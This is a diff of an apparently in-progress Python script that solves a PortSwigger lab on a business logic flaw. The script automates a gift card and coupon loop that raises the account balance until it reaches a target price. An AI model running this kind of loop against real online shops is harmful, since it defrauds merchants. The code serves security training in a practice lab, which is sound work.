@@ -1,6 +1,15 @@
 # A Python script that solves the following lab:
 # https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
 
+# Notes to self:
+# Clean Code
+# Use same quotation styles
+# Organize code
+# Make it easier to read
+# Rewrite every function
+# Handle errors
+# Print program proccess to user
+
 from bs4 import BeautifulSoup
 import requests
 import sys
@@ -52,27 +61,53 @@ def send_giftcards_to_cart(session):
 
 def apply_coupon(session, csrf_token):
     DATA = {"csrf": csrf_token, "coupon": "SIGNUP30"}
-    POST_APPLY_COUPON = session.post(LAB_URL + "/cart/coupon", data = DATA)
-    print(POST_APPLY_COUPON.text)
+    session.post(LAB_URL + "/cart/coupon", data = DATA)
+    return None
 
-def checkout(session):
-    1
+def checkout(session, csrf_token):
+    DATA = {"csrf": csrf_token}
+    CHECKOUT_RESPONSE = session.post(LAB_URL + "/cart/checkout", data = DATA)
+    CHECKOUT_HTML = CHECKOUT_RESPONSE.text
+    return CHECKOUT_HTML
+
+def get_gift_card_codes(html):
+    GIFT_CARD_CODES = []
+    SOUP = BeautifulSoup(html, "html.parser")
+    TABLE = SOUP.find('table', class_='is-table-numbers')
+    card_number = 1
+    for row in TABLE.find_all('tr'):
+        cell = row.find('td')
+        if cell:
+            GIFT_CARD_CODES.append(cell.text.strip())
+        if card_number == 14:
+            break
+        card_number += 1
+    return GIFT_CARD_CODES
+
+def claim_gift_cards(session, token, codes):
+    for code in codes:
+        data = {"csrf": token, "gift-card": code}
+        code_response = session.post(LAB_URL + "/my-account/gift-card", data = data)
+        print(code_response)
+    return None
 
 def add_money(session):
     ACCOUNT_PATH = "/my-account"
     TARGET_PRICE = 2000
     account_balance = 0
-    #while account_balance < TARGET_PRICE:
-    cart_page_html = send_giftcards_to_cart(session)
-    cart_page_csrf = find_csrf_token(cart_page_html)
-    apply_coupon(session, cart_page_csrf)
-    checkout()
-    
-    GET_MY_ACCOUNT = session.get(LAB_URL + ACCOUNT_PATH)
-    MY_ACCOUNT_HTML = GET_MY_ACCOUNT.text
-    account_balance = get_balance(MY_ACCOUNT_HTML)
-    print(account_balance)
-
+    while account_balance < TARGET_PRICE:
+        cart_page_html = send_giftcards_to_cart(session)
+        cart_page_csrf = find_csrf_token(cart_page_html)
+        apply_coupon(session, cart_page_csrf)
+        checkout_page_html = checkout(session, cart_page_csrf)
+        gift_card_codes = get_gift_card_codes(checkout_page_html)
+        print(gift_card_codes)
+        claim_gift_cards(session, cart_page_csrf, gift_card_codes) #reusing csrf token?
+        GET_MY_ACCOUNT = session.get(LAB_URL + ACCOUNT_PATH)
+        MY_ACCOUNT_HTML = GET_MY_ACCOUNT.text
+        account_balance = get_balance(MY_ACCOUNT_HTML)
+        print(account_balance)
+    return account_balance
 
 def main():
     print(f"Program Starting... Target URL: {LAB_URL}")
@@ -80,6 +115,7 @@ def main():
     if SESSION == None:
         sys.exit(1)
     NEW_BALANCE = add_money(SESSION)
+    print(f"Target price has been reached: {NEW_BALANCE}")
     return 0
 
 if __name__ == "__main__":
